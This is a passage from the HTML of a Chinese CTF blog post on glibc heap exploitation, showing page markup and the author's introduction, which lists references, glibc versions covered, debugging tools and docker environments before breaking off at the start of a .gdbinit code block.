<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130341804.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130255142.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015135526620.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140157626.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140331259.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140509323.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140538358.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140650996.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140716845.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140815350.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015140838808.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141053095.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141310006.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141338609.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015141353825.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015202953631.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203107725.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203416086.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203720711.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015203842452.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204330313.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015204706099.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/eg.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094308974.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094240180.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016094355521.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095050228.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231016095208868.png">
<meta property="article:published_time" content="2023-09-22T00:53:34.000Z">
<meta property="article:modified_time" content="2024-11-07T03:35:11.054Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Pwn_Heap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_F7M2S7WM7URA2WQ.png">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            深入理解Pwn_heap及赛题详细解析 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Essays":{"path":"/essays","icon":"fa-regular fa-comment"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/essays"
                        >
                            <span>Essays</span>
                            <i class="fa-regular fa-comment fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">136</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">深入理解Pwn_heap及赛题详细解析</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2023-09-22 08:53:34</span>
        <span class="mobile">2023-09-22 08:53:34</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-07 11:35:11</span>
            <span class="mobile">2024-11-07 11:35:11</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/CTF/">CTF</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/Pwn-Heap/">Pwn_Heap</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>ptmalloc2</code> 的管理方式，<code>chunk</code> 结构和 <code>bins</code> 的模型，在<a class="link"   target="_blank" rel="noopener" href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/" >Overview of GLIBC heap exploitation techniques <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/" >ctfwiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 以及<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Tokameine/article/details/119490052" >一些博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>已经讲解的非常清楚，本文记录自己的学习堆利用的过程。主要更新 <code>glibc-2.23，2.27，2.31，2.35，2.37</code> 主流版本和相关例题，<code>glibc-2.23</code> 后面更新一些变化和新的利用方式，这里不包含 <code>IO_FILE</code> 的内容，<code>IO_FILE</code> 会单独做一个专题。建议看完 <code>glibc</code> 源码分析后再来看，当然直接看也无所谓。目前比赛的 <code>glibc</code> 版本基本都是这几个长期支持版本，期间版本就不写了，另外文中没有标记 <code>glibc</code> 版本的就是到目前位置依然适用的方法。我将我的部分文章做了一个合集，入门新手先凑合着看吧。再看从前写的文章，很是稚嫩，不太易读易懂。</p>
<ul>
<li>主要配置</li>
</ul>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/RoderickChan/pwncli" >pwncli <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://github.com/scwuaptx/Pwngdb" >PwnGdb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-276203.htm" >gdb配置参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>我的主要操作环境</li>
</ul>
<p><code>wsl-kali</code>。配置参考我的<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-278044.htm" >另一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p><code>docker desktop</code>镜像</p>
<p><code>ubuntu:16.04</code></p>
<p><code>ubuntu:18.04</code></p>
<p><code>ubuntu:20.04</code></p>
<p><code>ubuntu:22.04</code></p>
<p><code>ubuntu:23.04</code></p>
<p>编译时可以加<code>-g</code>来方便调试。</p>
<p><code>ida pro 7.7 + gdb</code>调试。</p>
<ul>
<li>我的<code>.gdbinit</code>文件</li>
</ul>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 